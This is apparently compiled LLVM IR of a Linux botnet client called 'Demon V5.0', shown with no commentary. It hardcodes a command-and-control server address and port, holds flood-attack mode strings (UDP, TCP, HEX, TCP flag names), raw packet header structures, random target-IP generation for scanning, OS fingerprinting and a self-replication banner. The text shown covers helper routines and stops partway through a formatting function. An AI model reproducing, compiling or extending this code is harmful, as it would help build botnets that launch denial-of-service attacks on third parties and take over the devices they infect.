; ModuleID = 'host/ir_O0/Demon.e.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@Demonserv = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [19 x i8] c"165.227.34.187:666\00", align 1
@Demonicsock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@astd.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.11, i32 0, i32 0)], align 8
@.str.11 = private unnamed_addr constant [78 x i8] c"Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"/usr/bin/apt-get\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Ubuntu\00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"/usr/lib/portage\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"Gentoo\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"/usr/bin/yum\00", align 1
@.str.19 = private unnamed_addr constant [7 x i8] c"CentOS\00", align 1
@.str.20 = private unnamed_addr constant [17 x i8] c"/usr/share/YaST2\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"OpenSUSE\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"/usr/local/etc/pkg\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"FreeBSD\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"/etc/dropbear/\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"Dropbear\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/etc/opkg\00", align 1
@.str.27 = private unnamed_addr constant [8 x i8] c"OpenWRT\00", align 1
@.str.28 = private unnamed_addr constant [15 x i8] c"Unknown Distro\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.30 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"HEX\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.34 = private unnamed_addr constant [180 x i8] c"\1B[1;31mDemon\1B[1;37m[\1B[1;31mV5.0\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

; <label>:31:                                     ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10

; <label>:34:                                     ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #9
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9

; <label>:37:                                     ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %37
  br label %43

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

; <label>:43:                                     ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %101

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)) #6
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %101

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #6
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %101

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %98

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #6
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #6
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %97

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.0* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
  %96 = add nsw i32 %95, 1
  store i32 %96, i32* %10, align 4
  br label %79

; <label>:97:                                     ; preds = %79
  br label %98

; <label>:98:                                     ; preds = %97, %65
  %99 = load i32, i32* %2, align 4
  %100 = call i32 @close(i32 %99)
  br label %101

; <label>:101:                                    ; preds = %98, %36, %29, %15
  %102 = load i32, i32* %1, align 4
  ret i32 %102
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #3

declare i32 @open(i8*, i32, ...) #2

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

declare i32 @close(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #3

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #5

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #5

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #6
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #6
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #6

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %283, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %286

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %274

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %286

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %275

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %55

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = or i32 %53, 2
  store i32 %54, i32* %8, align 4
  br label %45

; <label>:55:                                     ; preds = %45
  br label %56

; <label>:56:                                     ; preds = %77, %55
  %57 = load i8*, i8** %5, align 8
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp sge i32 %59, 48
  br i1 %60, label %61, label %66

; <label>:61:                                     ; preds = %56
  %62 = load i8*, i8** %5, align 8
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp sle i32 %64, 57
  br label %66

; <label>:66:                                     ; preds = %61, %56
  %67 = phi i1 [ false, %56 ], [ %65, %61 ]
  br i1 %67, label %68, label %80

; <label>:68:                                     ; preds = %66
  %69 = load i32, i32* %7, align 4
  %70 = mul nsw i32 %69, 10
  store i32 %70, i32* %7, align 4
  %71 = load i8*, i8** %5, align 8
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = sub nsw i32 %73, 48
  %75 = load i32, i32* %7, align 4
  %76 = add nsw i32 %75, %74
  store i32 %76, i32* %7, align 4
  br label %77

; <label>:77:                                     ; preds = %68
  %78 = load i8*, i8** %5, align 8
  %79 = getelementptr inbounds i8, i8* %78, i32 1
  store i8* %79, i8** %5, align 8
  br label %56

; <label>:80:                                     ; preds = %66
  %81 = load i8*, i8** %5, align 8
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = icmp eq i32 %83, 115
  br i1 %84, label %85, label %119

; <label>:85:                                     ; preds = %80
  %86 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %87 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = icmp ule i32 %88, 40
  br i1 %89, label %90, label %96

